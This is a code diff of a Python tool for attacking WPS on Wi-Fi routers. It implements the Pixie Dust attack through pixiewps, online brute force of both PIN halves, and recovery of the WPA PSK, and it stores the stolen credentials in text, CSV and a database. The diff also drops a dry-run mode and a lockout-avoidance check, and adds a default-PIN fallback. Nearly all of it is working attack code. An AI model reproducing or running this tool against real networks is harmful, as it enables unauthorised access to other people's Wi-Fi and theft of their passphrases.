+        self._emit_json('pixiewps_output', rc=r.returncode, out=out)
 
         m = re.search(r"\[\+\]\s*WPS pin:\s*'?([^'\n\r]*)'?", out)
         if m:
             pin = m.group(1).strip()
-            if pin == '<empty>': return ''
-            if pin.isdigit() and len(pin) == 8: return pin
+            if pin == '<empty>':
+                self._emit_json('pixiewps_result', pin='')
+                return ''
+            if pin.isdigit() and len(pin) == 8:
+                self._emit_json('pixiewps_result', pin=pin)
+                return pin
             if pin.isdigit() and len(pin) == 7:
-                return pin + str(self.generator.checksum(int(pin)))
-        if _retry and not full_range and ('force' in out.lower() or 'full range' in out.lower()):
-            print(UI.msg('info', 'Retrying with --force…'), file=sys.stderr)
+                full = pin + str(self.generator.checksum(int(pin)))
+                self._emit_json('pixiewps_result', pin=full)
+                return full
+
+        if _retry and not full_range and (
+                'force' in out.lower() or 'full range' in out.lower()):
+            print(UI.msg('info', 'Retrying with --force (full range)…'))
             return self.__runPixiewps(showcmd, full_range=True, _retry=False)
+
         return False
 
-    def __credentialPrint(self, pin, psk, essid):
-        print(UI.section('Credentials recovered'), file=sys.stderr)
-        print(UI.table(['Field', 'Value'],
-                       [[UI.muted('WPS PIN'), UI.ok(pin)],
-                        [UI.muted('WPA PSK'), UI.ok(psk)],
-                        [UI.muted('ESSID'),   UI.hi(essid or '—')]]), file=sys.stderr)
-        self._emit_json('credentials', wps_pin=pin, wpa_psk=psk, essid=essid)
+    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
+        print(UI.section('Credentials recovered'))
+        print(UI.table(
+            ['Field', 'Value'],
+            [[UI.muted('WPS PIN'), UI.ok(wps_pin)],
+             [UI.muted('WPA PSK'), UI.ok(wpa_psk)],
+             [UI.muted('ESSID'),   UI.hi(essid or '—')]],
+            aligns=['l', 'l']))
+        self._emit_json('credentials', wps_pin=wps_pin,
+                        wpa_psk=wpa_psk, essid=essid)
 
-    def __saveResult(self, bssid, essid, pin, psk):
-        _save_result(self.db, bssid, essid, pin, psk, self.reports_dir,
-                     self.json_mode, self.json_stdout)
+    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
+        # [FIX] Make sure the directory exists and surface write errors.
+        try:
+            os.makedirs(self.reports_dir, exist_ok=True)
+        except OSError as e:
+            print(UI.msg('err', f'Cannot create reports dir {self.reports_dir}: {e}'))
+            return
+        filename = os.path.join(self.reports_dir, 'stored')
+        dateStr = datetime.now().strftime('%d.%m.%Y %H:%M')
+        try:
+            with open(filename + '.txt', 'a', encoding='utf-8') as f:
+                f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\n'
+                        f'WPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n')
+            header = not os.path.isfile(filename + '.csv')
+            with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
+                w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
+                if header:
+                    w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
+                w.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
+        except OSError as e:
+            print(UI.msg('err', f'Failed to write credentials to {filename}: {e}'))
+            return
+        print(UI.msg('info', f'Credentials saved to {filename}.txt, {filename}.csv'))
+        try:
+            self.db.save_credentials(bssid, essid, wps_pin, wpa_psk)
+        except Exception as e:
+            print(UI.msg('err', f'Failed to save credentials to DB: {e}'))
+        self._emit_json('credentials_saved', bssid=bssid,
+                        essid=essid, wps_pin=wps_pin, wpa_psk=wpa_psk)
 
     def __savePin(self, bssid, pin):
-        if not pin or not isinstance(pin, str): return
-        filename = os.path.join(self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
-        _safe_makedirs(self.pixiewps_dir)
+        # [FIX] Surface filesystem errors instead of crashing.
+        filename = os.path.join(
+            self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
         try:
-            with open(filename, 'w', encoding='utf-8') as f: f.write(pin)
+            os.makedirs(self.pixiewps_dir, exist_ok=True)
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(pin)
         except OSError as e:
-            print(UI.msg('err', f'Cannot save PIN to {filename}: {e}'), file=sys.stderr)
+            print(UI.msg('err', f'Cannot save PIN to {filename}: {e}'))
             return
+        print(UI.msg('info', f'PIN saved in {filename}'))
         self._emit_json('pin_saved', bssid=bssid, pin=pin, path=filename)
 
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggestedUnique(bssid)
-        if not pins: return None
         if len(pins) > 1:
-            print(UI.section(f'PINs generated for {bssid}'), file=sys.stderr)
-            print(UI.table(['#', 'PIN', 'Name'],
-                           [[UI.muted(f'{i + 1})'), UI.ok(p['pin']), p['name']]
-                            for i, p in enumerate(pins)],
-                           aligns=['r', 'l', 'l']), file=sys.stderr)
+            print(UI.section(f'PINs generated for {bssid} (deduplicated)'))
+            rows = [[UI.muted(f'{i + 1})'), UI.ok(p['pin']), p['name']]
+                    for i, p in enumerate(pins)]
+            print(UI.table(['#', 'PIN', 'Name'], rows, aligns=['r', 'l', 'l']))
             while True:
+                pinNo = input(UI.info('Select the PIN: '))
                 try:
-                    c = input(UI.info('Select PIN: ')).strip()
-                    i = int(c)
-                    if 1 <= i <= len(pins): return pins[i - 1]['pin']
-                except (ValueError, EOFError, KeyboardInterrupt):
-                    return None
-        return pins[0]['pin']
+                    idx = int(pinNo)
+                    if 1 <= idx <= len(pins):
+                        return pins[idx - 1]['pin']
+                    raise IndexError
+                except (ValueError, IndexError):
+                    print(UI.msg('err', 'Invalid number'))
+        elif len(pins) == 1:
+            print(UI.msg('info', f"The only probable PIN is selected: {pins[0]['name']}"))
+            return pins[0]['pin']
+        return None
 
-    # --- WPS connection ---
     def __wps_connection(self, bssid=None, pin=None, pixiemode=False,
                          pbc_mode=False, verbose=None, max_retries=3):
-        if verbose is None: verbose = self.print_debug
+        if verbose is None:
+            verbose = self.print_debug
         self.pixie_creds.clear()
         self.connection_status.clear()
-        # drain any stale lines
-        while True:
-            try: self._line_q.get_nowait()
-            except queue.Empty: break
+        try:
+            self.wpas.stdout.read(300)
+        except Exception:
+            pass
 
         if pbc_mode:
-            print(UI.msg('info', f'Starting PBC{" to " + bssid if bssid else ""}…'),
-                  file=sys.stderr)
-            cmd = f'WPS_PBC {bssid}' if bssid else 'WPS_PBC'
+            if bssid:
+                print(UI.msg('info', f'Starting WPS push button connection to {UI.hi(bssid)}…'))
+                cmd = f'WPS_PBC {bssid}'
+            else:
+                print(UI.msg('info', 'Starting WPS push button connection…'))
+                cmd = 'WPS_PBC'
         else:
-            print(UI.msg('info', f"Trying PIN '{UI.hi(pin)}'…"), file=sys.stderr)
+            print(UI.msg('info', f"Trying PIN '{UI.hi(pin)}'…"))
             cmd = f'WPS_REG {bssid} {pin}'
-
-        if self.dry_run:
-            print(f'  {UI.muted("[dry-run cmd]")} {cmd}', file=sys.stderr)
-            return False
 
         for attempt in range(1, max_retries + 1):
             r = self.sendAndReceive(cmd)
             if 'OK' not in r:
                 self.connection_status.status = 'WPS_FAIL'
-                print(UI.msg('err', self._explain_wpas_not_ok_status(cmd, r)), file=sys.stderr)
+                print(UI.msg('err', self._explain_wpas_not_ok_status(cmd, r)))
                 if attempt < max_retries:
                     back = 2 ** attempt
-                    print(UI.msg('warn', f'Backing off {back}s'), file=sys.stderr)
-                    time.sleep(back); continue
+                    print(UI.msg('warn', f'Backing off {back}s (retry {attempt}/{max_retries})'))
+                    time.sleep(back)
+                    continue
                 return False
-            # consume lines until a terminal state
-            deadline = time.time() + 120
-            while time.time() < deadline:
-                if self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
+
+            while True:
+                if not self.__handle_wpas(
+                        pixiemode=pixiemode, pbc_mode=pbc_mode,
+                        verbose=verbose, bssid=(bssid or '').lower()):
                     break
-                if not self._drain_q(timeout=0.2):
+                if self.connection_status.status in (
+                        'WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                     break
+
             self.sendOnly('WPS_CANCEL')
-            if self.connection_status.status == 'GOT_PSK': return True
-            if self.connection_status.status == 'WPS_FAIL' and attempt < max_retries:
+
+            if self.connection_status.status == 'GOT_PSK':
+                return True
+
+            if self.connection_status.status == 'WPS_FAIL' \
+                    and attempt < max_retries:
                 back = 2 ** attempt
-                print(UI.msg('warn', f'WPS transaction failed; backing off {back}s'),
-                      file=sys.stderr)
-                time.sleep(back); continue
+                print(UI.msg('warn', f'WPS transaction failed; backing off {back}s '
+                             f'(retry {attempt}/{max_retries})'))
+                time.sleep(back)
+                continue
             break
+
         if self.connection_status.nack_count >= 3:
-            print(UI.msg('warn', '3+ NACKs — possible lockout risk'), file=sys.stderr)
-            if self.lockout_budget and bssid:
-                self.db.set_lockout(bssid, self.cool_down)
+            print(UI.msg('warn', '3+ consecutive NACKs — possible AP lockout risk.'))
             if self.cool_down > 0:
-                print(UI.msg('info', f'Cooling down {self.cool_down}s'), file=sys.stderr)
+                print(UI.msg('info', f'Cooling down {self.cool_down}s.'))
                 time.sleep(self.cool_down)
         return False
 
@@ -1680,223 +2077,195 @@ class Companion:
                           pbc_mode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False):
         if not bssid and not pbc_mode:
-            print(UI.msg('err', 'No BSSID supplied'), file=sys.stderr); return False
-        if bssid and self.lockout_budget and self.db.is_locked(bssid):
-            print(UI.msg('warn', f'{bssid} locked — skipping (lockout budget)'),
-                  file=sys.stderr); return False
+            print(UI.msg('err', 'No BSSID supplied to single_connection()'))
+            return False
 
         if not pin and not pbc_mode and bssid:
             known = self.db.known_pin(bssid)
             if known:
-                print(UI.msg('info', f'Known PIN in DB: {known}'), file=sys.stderr)
+                print(UI.msg('info', f'Known PIN in DB for {bssid}: {known} — trying first.'))
                 pin = known
 
         if (not pixiemode and not pbc_mode and not pin and bssid
                 and self.target_is_pixie_vuln):
             chipset = self.target_chipset or 'unknown chipset'
-            print(UI.msg('warn', f'Target looks Pixie Dust vulnerable ({chipset})'),
-                  file=sys.stderr)
-            if self.auto_mode: pixiemode = True
+            print(UI.msg('warn', f'Target {bssid} looks Pixie Dust vulnerable ({chipset}).'))
+            if self.auto_mode:
+                pixiemode = True
             else:
-                try:
-                    if input(UI.info('[?] Try Pixie Dust first? [Y/n] ')).strip().lower() != 'n':
-                        pixiemode = True
-                except (EOFError, KeyboardInterrupt): pixiemode = True
+                ans = input(UI.info('[?] Try Pixie Dust attack first? [Y/n] ')).strip().lower()
+                if ans != 'n':
+                    pixiemode = True
 
         if not pin:
             if pixiemode and bssid:
                 try:
-                    fn = os.path.join(self.pixiewps_dir,
-                                      f'{bssid.replace(":", "").upper()}.run')
+                    fn = os.path.join(
+                        self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
                     with open(fn, 'r', encoding='utf-8') as f:
                         t_pin = f.readline().strip()
-                    if self.auto_mode: pin = t_pin
+                    if self.auto_mode:
+                        pin = t_pin
+                    elif input(UI.info(f'[?] Use previously calculated PIN '
+                                       f'{t_pin}? [n/Y] ')).lower() != 'n':
+                        pin = t_pin
                     else:
-                        try:
-                            if input(UI.info(f'[?] Use saved PIN {t_pin}? [n/Y] ')).lower() != 'n':
-                                pin = t_pin
-                            else: raise FileNotFoundError
-                        except (EOFError, KeyboardInterrupt): pin = t_pin
+                        raise FileNotFoundError
                 except FileNotFoundError:
-                    pin = self.generator.getLikely(bssid)
-                    if not pin:
-                        print(UI.msg('warn', f'No suggestion for {bssid}'), file=sys.stderr)
-                        return False
+                    pin = self.generator.getLikely(bssid) or '12345670'
             elif not pbc_mode and bssid:
-                if self.auto_mode: pin = self.generator.getLikely(bssid)
-                else: pin = self.__prompt_wpspin(bssid)
-                if not pin:
-                    print(UI.msg('warn', f'No suggestion for {bssid}'), file=sys.stderr)
-                    return False
+                if self.auto_mode:
+                    pin = self.generator.getLikely(bssid) or '12345670'
+                else:
+                    pin = self.__prompt_wpspin(bssid) or '12345670'
 
-        if bssid: self.db.bump_attempts(bssid)
+        if bssid:
+            self.db.bump_attempts(bssid)
 
         if pbc_mode:
             self.__wps_connection(bssid, pbc_mode=True)
             bssid = getattr(self.connection_status, 'bssid', bssid) or bssid
-            pin = '<PBC>'
+            pin = '<PBC mode>'
         elif store_pin_on_fail:
             try:
                 self.__wps_connection(bssid, pin, pixiemode)
             except KeyboardInterrupt:
-                print('\n' + UI.msg('warn', 'Aborting…'), file=sys.stderr)
-                if bssid: self.__savePin(bssid, pin)
+                print('\n' + UI.msg('warn', 'Aborting…'))
+                if bssid:
+                    self.__savePin(bssid, pin)
                 return False
         else:
             self.__wps_connection(bssid, pin, pixiemode)
 
         if self.connection_status.status == 'GOT_PSK':
-            self.__credentialPrint(pin, self.connection_status.wpa_psk,
-                                   self.connection_status.essid)
+            self.__credentialPrint(
+                pin, self.connection_status.wpa_psk,
+                self.connection_status.essid)
             if self.save_result and bssid:
                 self.__saveResult(bssid, self.connection_status.essid,
                                   pin, self.connection_status.wpa_psk)
             if not pbc_mode and bssid:
-                try: os.remove(os.path.join(
-                    self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run'))
-                except FileNotFoundError: pass
-            return True
-
-        if pixiemode:
-            if self.save_capture and bssid and self.pixie_creds.to_dict():
-                try: self.db.save_capture(bssid, self.pixie_creds)
-                except Exception: pass
-                capdir = _captures_dir()
                 try:
-                    with open(os.path.join(capdir, f'{bssid.replace(":", "").upper()}.json'),
-                              'w', encoding='utf-8') as f:
-                        f.write(self.pixie_creds.to_json())
-                except OSError: pass
-            if self.pixie_creds.got_all() or pixieforce:
-                new_pin = self.__runPixiewps(showpixiecmd, pixieforce)
-                if new_pin is not False:
-                    return self.single_connection(bssid, new_pin,
-                                                  pixiemode=False,
-                                                  store_pin_on_fail=True)
+                    os.remove(os.path.join(
+                        self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run'))
+                except FileNotFoundError:
+                    pass
+            return True
+        elif pixiemode:
+            if self.pixie_creds.got_all():
+                pin = self.__runPixiewps(showpixiecmd, pixieforce)
+                if pin is not False:
+                    return self.single_connection(
+                        bssid, pin, pixiemode=False,
+                        store_pin_on_fail=True)
                 return False
-            print(UI.msg('err', f'Not enough Pixie data ({self.pixie_creds.status_line()})'),
-                  file=sys.stderr)
+            print(UI.msg('err', f'Not enough data to run Pixie Dust attack '
+                                f'({self.pixie_creds.status_line()})'))
+            return False
+        else:
+            if store_pin_on_fail and bssid:
+                self.__savePin(bssid, pin)
             return False
 
-        if store_pin_on_fail and bssid:
-            self.__savePin(bssid, pin)
-        return False
-
-    # --- bruteforce ---
-    def __first_half_bruteforce(self, bssid, f_half, delay=None, _max_retries=3):
+    def __first_half_bruteforce(self, bssid, f_half, delay=None,
+                                _max_retries=3):
+        checksum = self.generator.checksum
         while int(f_half) < 10000:
             t = int(f_half + '000')
-            pin = f'{f_half}000{WPSpin.checksum(t)}'
+            pin = f'{f_half}000{checksum(t)}'
             self.single_connection(bssid, pin)
             if self.connection_status.isFirstHalfValid():
-                print(UI.msg('ok', 'First half found'), file=sys.stderr)
+                print(UI.msg('ok', 'First half found'))
                 return f_half
             if self.connection_status.status == 'WPS_FAIL':
+                print(UI.msg('warn', 'WPS transaction failed, re-trying last pin'))
                 _max_retries -= 1
                 if _max_retries <= 0:
-                    print(UI.msg('err', 'Max retries reached'), file=sys.stderr)
+                    print(UI.msg('err', 'Max retries reached for current PIN'))
                     return False
                 continue
             f_half = str(int(f_half) + 1).zfill(4)
             self.bruteforce.registerAttempt(f_half)
             _max_retries = 3
-            if delay: time.sleep(delay)
-        print(UI.msg('err', 'First half not found'), file=sys.stderr)
+            if delay:
+                time.sleep(delay)
+        print(UI.msg('err', 'First half not found'))
         return False
 
-    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None, _max_retries=3):
+    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None,
+                                 _max_retries=3):
+        checksum = self.generator.checksum
         while int(s_half) < 1000:
             t = int(f_half + s_half)
-            pin = f'{f_half}{s_half}{WPSpin.checksum(t)}'
+            pin = f'{f_half}{s_half}{checksum(t)}'
             self.single_connection(bssid, pin)
             if self.connection_status.last_m_message > 6:
                 return pin
             if self.connection_status.status == 'WPS_FAIL':
+                print(UI.msg('warn', 'WPS transaction failed, re-trying last pin'))
                 _max_retries -= 1
                 if _max_retries <= 0:
-                    print(UI.msg('err', 'Max retries reached'), file=sys.stderr)
+                    print(UI.msg('err', 'Max retries reached for current PIN'))
                     return False
                 continue
             s_half = str(int(s_half) + 1).zfill(3)
             self.bruteforce.registerAttempt(f_half + s_half)
             _max_retries = 3
-            if delay: time.sleep(delay)
+            if delay:
+                time.sleep(delay)
         return False
 
     def smart_bruteforce(self, bssid, start_pin=None, delay=None,
                          loop=False, auto_resume=False):
-        self.bruteforce = BruteforceStatus()
         if (not start_pin) or (len(start_pin) < 4):
             try:
-                fn = os.path.join(self.sessions_dir,
-                                  f'{bssid.replace(":", "").upper()}.run')
+                fn = os.path.join(
+                    self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
                 with open(fn, 'r', encoding='utf-8') as f:
-                    mask = f.readline().strip() or '0000'
+                    if auto_resume or self.auto_mode:
+                        mask = f.readline().strip()
+                        print(UI.msg('info', f'Resuming saved session for {bssid} (mask: {mask})'))
+                    elif input(UI.info(f'[?] Restore previous session for {bssid}? '
+                                       f'[n/Y] ')).lower() != 'n':
+                        mask = f.readline().strip()
+                    else:
+                        raise FileNotFoundError
             except FileNotFoundError:
                 mask = '0000'
         else:
             mask = start_pin[:7]
-        self.bruteforce.mask = mask
+
         try:
+            self.bruteforce = BruteforceStatus()
+            self.bruteforce.mask = mask
             if len(mask) == 4:
                 f_half = self.__first_half_bruteforce(bssid, mask, delay)
                 if f_half and self.connection_status.status != 'GOT_PSK':
                     self.__second_half_bruteforce(bssid, f_half, '001', delay)
             elif len(mask) == 7:
-                self.__second_half_bruteforce(bssid, mask[:4], mask[4:], delay)
+                self.__second_half_bruteforce(
+                    bssid, mask[:4], mask[4:], delay)
             if self.connection_status.status == 'GOT_PSK':
-                print(UI.msg('ok', 'Bruteforce complete'), file=sys.stderr)
+                print(UI.msg('ok', 'Brute-force complete — credentials recovered.'))
+                return
         except KeyboardInterrupt:
-            print('\n' + UI.msg('warn', 'Aborting…'), file=sys.stderr)
-            fn = os.path.join(self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
-            _safe_makedirs(self.sessions_dir)
+            print('\n' + UI.msg('warn', 'Aborting…'))
+            fn = os.path.join(
+                self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
             try:
-                with open(fn, 'w', encoding='utf-8') as f: f.write(self.bruteforce.mask)
-                print(UI.msg('info', f'Session saved in {fn}'), file=sys.stderr)
+                os.makedirs(self.sessions_dir, exist_ok=True)
+                with open(fn, 'w', encoding='utf-8') as f:
+                    f.write(self.bruteforce.mask)
+                print(UI.msg('info', f'Session saved in {fn}'))
             except OSError as e:
-                print(UI.msg('err', f'Cannot save session: {e}'), file=sys.stderr)
-            if loop: raise
+                print(UI.msg('err', f'Cannot save session to {fn}: {e}'))
+            if loop:
+                raise
 
     def __print_with_indicators(self, level, msg):
-        print(f'{UI.muted(f"[{level}]")} {UI.muted(f"[{self.lastPwr}]")} {msg}',
-              file=sys.stderr)
-
-
-# ---------------------------------------------------------------------------
-# Offline replay
-# ---------------------------------------------------------------------------
-def offline_replay(path, full_range=False, timeout=120, db: Optional[TargetDB] = None,
-                   bssid=None):
-    try:
-        with open(path, 'r', encoding='utf-8') as f:
-            data = json.load(f)
-    except (OSError, json.JSONDecodeError) as e:
-        print(UI.msg('err', f'Cannot read capture {path}: {e}'), file=sys.stderr)
-        return False
-    p = PixiewpsData.from_dict(data)
-    print(UI.info(f'Loaded {p!r}'), file=sys.stderr)
-    if not p.got_all() and not full_range:
-        print(UI.msg('warn', 'Incomplete capture; re-run with --pixie-force'),
-              file=sys.stderr)
-        return False
-    argv = p.get_pixie_args(full_range=full_range, timeout=timeout)
-    print(UI.muted('  ' + ' '.join(argv)), file=sys.stderr)
-    try:
-        rc, out = run_proc(argv, timeout=timeout, stdout=subprocess.PIPE,
-                           stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
-    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
-        print(UI.msg('err', f'pixiewps failed: {e}'), file=sys.stderr); return False
-    out = out or ''
-    print(out, file=sys.stderr)
-    m = re.search(r"\[\+\]\s*WPS pin:\s*'?([^'\n\r]*)'?", out)
-    if not m:
-        print(UI.msg('err', 'No PIN in pixiewps output'), file=sys.stderr); return False
-    pin = m.group(1).strip()
-    if pin.isdigit() and len(pin) == 7: pin += str(WPSpin.checksum(int(pin)))
-    print(UI.ok(f'WPS PIN: {pin}'), file=sys.stderr)
-    if db and bssid:
-        db.save_credentials(bssid, '', pin, '')
-    return pin
+        tag = UI.muted(f'[{level}]')
+        pwr = UI.muted(f'[{self.lastPwr}]')
+        print(f'{tag} {pwr} {msg}')
 
 
 # ---------------------------------------------------------------------------
@@ -1904,7 +2273,7 @@ def offline_replay(path, full_range=False, timeout=120, db: Optional[TargetDB] =
 # ---------------------------------------------------------------------------
 class WiFiScanner:
     def __init__(self, interface, vuln_list=None, reverse_scan=False,
-                 db=None, min_rssi=None, band=None):
+                 db: Optional[TargetDB] = None, min_rssi=None, band=None):
         self.interface = interface
         self.vuln_list = vuln_list or []
         self.reverse_scan = reverse_scan
@@ -1915,116 +2284,170 @@ class WiFiScanner:
         self.selected_chipset = ''
         self.selected_channel = 0
         self.selected_wps = False
+
         self.stored = []
+        # [FIX] Read stored.csv from the *same* writable reports dir that
+        #       saves write to.
         reports = os.path.join(pick_reports_dir(), 'stored.csv')
         try:
-            with open(reports, 'r', newline='', encoding='utf-8', errors='replace') as f:
+            with open(reports, 'r', newline='',
+                      encoding='utf-8', errors='replace') as f:
                 r = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                 next(r, None)
                 for row in r:
-                    if len(row) >= 3: self.stored.append((row[1], row[2]))
-        except FileNotFoundError: pass
+                    if len(row) >= 3:
+                        self.stored.append((row[1], row[2]))
+        except FileNotFoundError:
+            pass
 
     @staticmethod
     def _classify_pixie_vuln(network):
-        hay = ' '.join([network.get('Model', ''), network.get('Model number', ''),
-                        network.get('Device name', '')]).upper()
-        for kw, label in PIXIE_VULNERABLE_CHIPSETS.items():
-            if kw.upper() in hay: return True, label
+        haystack = ' '.join([
+            network.get('Model', ''),
+            network.get('Model number', ''),
+            network.get('Device name', ''),
+        ]).upper()
+        for keyword, label in PIXIE_VULNERABLE_CHIPSETS.items():
+            if keyword.upper() in haystack:
+                return True, label
         return False, ''
 
     def iw_scanner(self) -> Optional[Dict[int, dict]]:
-        networks = []
-
-        def new_net(bssid):
-            networks.append({'BSSID': bssid, 'Security type': 'Unknown',
-                             'WPS': False, 'WPS version': '', 'WPS locked': False,
-                             'Model': '', 'Model number': '', 'Device name': '',
-                             'Channel': 0, 'Frequency': 0, 'Level': -100})
+        def handle_network(line, result, networks):
+            networks.append({
+                'Security type': 'Unknown', 'WPS': False,
+                'WPS locked': False, 'Model': '',
+                'Model number': '', 'Device name': '',
+                'Channel': 0, 'Frequency': 0, 'Level': -100,
+            })
+            networks[-1]['BSSID'] = result.group(1).upper()
 
         def _decode(d):
-            try:
-                b = codecs.escape_decode(d.encode('latin1', 'replace'))[0]
-                return b.decode('utf-8', errors='replace')
-            except Exception:
-                return d
+            return (codecs.decode(d, 'unicode-escape')
+                    .encode('latin1').decode('utf-8', errors='replace'))
 
-        def handle_essid(line, m, nets):
-            if nets: nets[-1]['ESSID'] = _decode(m.group(1))
-        def handle_level(line, m, nets):
-            if nets: nets[-1]['Level'] = int(float(m.group(1)))
-        def handle_freq(line, m, nets):
-            if not nets: return
-            f = int(m.group(1)); nets[-1]['Frequency'] = f
-            if 2412 <= f <= 2484:
-                nets[-1]['Channel'] = 14 if f == 2484 else (f - 2412) // 5 + 1
-            elif 5180 <= f <= 5825:
-                nets[-1]['Channel'] = (f - 5000) // 5
-            elif 5955 <= f <= 7115:
-                nets[-1]['Channel'] = (f - 5955) // 20 + 1
-        def handle_security(line, m, nets):
-            if not nets: return
-            sec = nets[-1]['Security type']
-            key = m.group(1)
-            if key == 'capability':
-                nets[-1]['Security type'] = 'WEP' if 'Privacy' in m.group(2) else 'Open'
+        def handle_essid(line, result, networks):
+            if not networks:
                 return
-            if key == 'RSN':
-                sec = 'WPA/WPA2' if sec == 'WPA' else 'WPA2'
-            elif key == 'WPA':
-                sec = 'WPA/WPA2' if sec == 'WPA2' else 'WPA'
-            nets[-1]['Security type'] = sec
-        def handle_wps(line, m, nets):
-            if nets:
-                nets[-1]['WPS'] = True
-                nets[-1]['WPS version'] = m.group(1)
-        def handle_wpsLocked(line, m, nets):
-            if nets and int(m.group(1), 16): nets[-1]['WPS locked'] = True
-        def handle_model(line, m, nets):
-            if nets: nets[-1]['Model'] = _decode(m.group(1))
-        def handle_modelNumber(line, m, nets):
-            if nets: nets[-1]['Model number'] = _decode(m.group(1))
-        def handle_deviceName(line, m, nets):
-            if nets: nets[-1]['Device name'] = _decode(m.group(1))
+            networks[-1]['ESSID'] = _decode(result.group(1))
 
+        def handle_level(line, result, networks):
+            if not networks:
+                return
+            networks[-1]['Level'] = int(float(result.group(1)))
+
+        def handle_securityType(line, result, networks):
+            if not networks:
+                return
+            sec = networks[-1]['Security type']
+            if result.group(1) == 'capability':
+                sec = 'WEP' if 'Privacy' in result.group(2) else 'Open'
+            elif sec == 'WEP':
+                if result.group(1) == 'RSN':
+                    sec = 'WPA2'
+                elif result.group(1) == 'WPA':
+                    sec = 'WPA'
+            elif sec == 'WPA' and result.group(1) == 'RSN':
+                sec = 'WPA/WPA2'
+            elif sec == 'WPA2' and result.group(1) == 'WPA':
+                sec = 'WPA/WPA2'
+            networks[-1]['Security type'] = sec
+
+        def handle_wps(line, result, networks):
+            if not networks:
+                return
+            networks[-1]['WPS'] = result.group(1)
+
+        def handle_wpsLocked(line, result, networks):
+            if not networks:
+                return
+            if int(result.group(1), 16):
+                networks[-1]['WPS locked'] = True
+
+        def handle_model(line, result, networks):
+            if not networks:
+                return
+            networks[-1]['Model'] = _decode(result.group(1))
+
+        def handle_modelNumber(line, result, networks):
+            if not networks:
+                return
+            networks[-1]['Model number'] = _decode(result.group(1))
+
+        def handle_deviceName(line, result, networks):
+            if not networks:
+                return
+            networks[-1]['Device name'] = _decode(result.group(1))
+
+        def handle_frequency(line, result, networks):
+            if not networks:
+                return
+            freq = int(result.group(1))
+            networks[-1]['Frequency'] = freq
+            if 2412 <= freq <= 2484:
+                networks[-1]['Channel'] = 14 if freq == 2484 else (freq - 2412) // 5 + 1
+            elif 5180 <= freq <= 5825:
+                networks[-1]['Channel'] = (freq - 5000) // 5
+            elif 5955 <= freq <= 7115:
+                networks[-1]['Channel'] = (freq - 5950) // 5
+            else:
+                networks[-1]['Channel'] = 0
+
+        # Plain `iw scan` — no --all (broken on many Kali iw builds).
+        argv = ['iw', 'dev', self.interface, 'scan']
         try:
-            _, out = run_proc(['iw', 'dev', self.interface, 'scan'],
-                              timeout=60, stdout=subprocess.PIPE,
-                              stderr=subprocess.STDOUT,
-                              encoding='utf-8', errors='replace')
+            proc = subprocess.run(argv,
+                                  stdout=subprocess.PIPE,
+                                  stderr=subprocess.STDOUT,
+                                  encoding='utf-8', errors='replace')
         except FileNotFoundError:
-            print(UI.msg('err', 'iw not found'), file=sys.stderr); return False
-        except subprocess.TimeoutExpired:
-            print(UI.msg('err', 'iw scan timed out'), file=sys.stderr); return False
+            print(UI.msg('err', 'iw not found — install wireless-tools / iw'))
+            return False
 
-        matchers = [
-            (re.compile(r'BSS (\S+)(?:\(on \w+\))?'), lambda line, m, nets: new_net(m.group(1).upper())),
-            (re.compile(r'SSID: (.*)'), handle_essid),
-            (re.compile(r'freq: (\d+)'), handle_freq),
-            (re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'), handle_level),
-            (re.compile(r'(capability): (.+)'), handle_security),
-            (re.compile(r'(RSN):\s+\* Version: (\d+)'), handle_security),
-            (re.compile(r'(WPA):\s+\* Version: (\d+)'), handle_security),
-            (re.compile(r'WPS:\s+\* Version: (([0-9]*[.])?[0-9]+)'), handle_wps),
-            (re.compile(r'\* AP setup locked: (0x[0-9a-fA-F]+)'), handle_wpsLocked),
-            (re.compile(r'\* Model: (.*)'), handle_model),
-            (re.compile(r'\* Model Number: (.*)'), handle_modelNumber),
-            (re.compile(r'\* Device name: (.*)'), handle_deviceName),
-        ]
-        for line in (out or '').splitlines():
+        lines = proc.stdout.splitlines()
+        networks = []
+        matchers = {
+            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
+            re.compile(r'SSID: (.*)'): handle_essid,
+            re.compile(r'freq: (\d+)'): handle_frequency,
+            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
+            re.compile(r'(capability): (.+)'): handle_securityType,
+            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
+            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
+            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
+            re.compile(r' [*] Model: (.*)'): handle_model,
+            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
+            re.compile(r' [*] Device name: (.*)'): handle_deviceName,
+        }
+
+        for line in lines:
             if line.startswith('command failed:'):
-                print(UI.msg('err', f'iw: {line}'), file=sys.stderr); return False
-            s = line.strip('\t')
-            for rx, h in matchers:
-                m = re.match(rx, s)
-                if m: h(s, m, networks)
